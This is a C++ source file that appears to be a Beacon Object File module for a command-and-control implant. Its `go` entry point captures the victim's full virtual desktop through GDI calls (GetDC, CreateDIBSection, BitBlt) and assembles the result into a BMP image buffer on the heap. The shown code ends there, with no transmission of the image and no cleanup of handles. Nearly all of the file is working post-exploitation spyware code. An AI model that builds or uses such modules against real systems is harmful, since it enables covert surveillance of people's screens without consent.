#include <Beacon.hpp>

#define BITMAP_COLOR_DEPTH 24
#define BITMAP_MAGIC_VALUE 0x4d42

void go ( char* args, int argc ) {
    auto ImgBuff    = PBYTE{ 0 };
    auto ImgSize    = ULONG{ 0 };
    auto TmpPointer = PBYTE{ 0 };
    auto MmDevCtx   = HDC{ 0 };
    auto DevCtx     = HDC{ 0 };
    auto VirtualX   = INT{ 0 };
    auto VirtualY   = INT{ 0 };
    auto GdiCur     = HGDIOBJ{ 0 };
    auto Desktop    = BITMAP{ 0 };
    auto GdiObject  = HGDIOBJ{ 0 };
    auto BmpFileHdr = BITMAPFILEHEADER{ 0 };
    auto BmpInfoHdr = BITMAPINFOHEADER{ 0 };
    auto BmpSection = HBITMAP{ 0 };
    auto BmpInfo    = BITMAPINFO{ 0 };
    auto BmpBuff    = PVOID{ 0 };
    auto ImgLen     = ULONG{ 0 };
    
    VirtualX = GetSystemMetrics( SM_XVIRTUALSCREEN );
    VirtualY = GetSystemMetrics( SM_YVIRTUALSCREEN );
    
    DevCtx = User32.GetDC( NULL );
    if ( !DevCtx ) return;
    
    GdiCur = Gdi32.GetCurrentObject( DevCtx, OBJ_BITMAP );
    if ( !GdiCur ) return;
    
    ::GetObjectW( GdiCur, sizeof( BITMAP ), &Desktop );
    
    ImgLen = ( ( ( BITMAP_COLOR_DEPTH * Desktop.bmWidth + 31 ) & ~31 ) / 8 ) * Desktop.bmHeight; // crazy formula to get image content length
    
    BmpFileHdr.bfType    = BITMAP_MAGIC_VALUE;                                         // bit map magic value
    BmpFileHdr.bfOffBits = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER );    // image content data offset
    BmpFileHdr.bfSize    = BmpFileHdr.bfOffBits + ImgLen;                                 // file full length
    
    BmpInfoHdr.biSize        = sizeof( BITMAPINFOHEADER ); // header length
    BmpInfoHdr.biBitCount    = BITMAP_COLOR_DEPTH;         // color depth
    BmpInfoHdr.biCompression = BI_RGB;                     // compression type
    BmpInfoHdr.biPlanes      = 1;                          // color plan number
    BmpInfoHdr.biWidth       = Desktop.bmWidth;            // image width
    BmpInfoHdr.biHeight      = Desktop.bmHeight;           // image heigth
    
    ImgSize = BmpFileHdr.bfSize;
    ImgBuff = (PBYTE)Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0x08, ImgSize );
    
    MmDevCtx = Gdi32.CreateCompatibleDC( DevCtx );
    if ( !MmDevCtx ) return;
    
    BmpInfo.bmiHeader = BmpInfoHdr;
    
    BmpSection = Gdi32.CreateDIBSection( DevCtx, &BmpInfo, DIB_RGB_COLORS, &BmpBuff, NULL, 0 );
    
    GdiObject = Gdi32.SelectObject( MmDevCtx, BmpSection );
    
    Gdi32.BitBlt( MmDevCtx, 0, 0, Desktop.bmWidth, Desktop.bmHeight, DevCtx, VirtualX, VirtualY, SRCCOPY );
    
    TmpPointer = ImgBuff;
    Mem::Copy( TmpPointer, &BmpFileHdr, sizeof( BmpFileHdr ) );
    TmpPointer += sizeof( BmpFileHdr );
    Mem::Copy( TmpPointer, &BmpInfoHdr, sizeof( BmpInfoHdr ) );
    TmpPointer += sizeof( BmpInfoHdr );
    Mem::Copy( TmpPointer, BmpBuff, ImgLen );
}
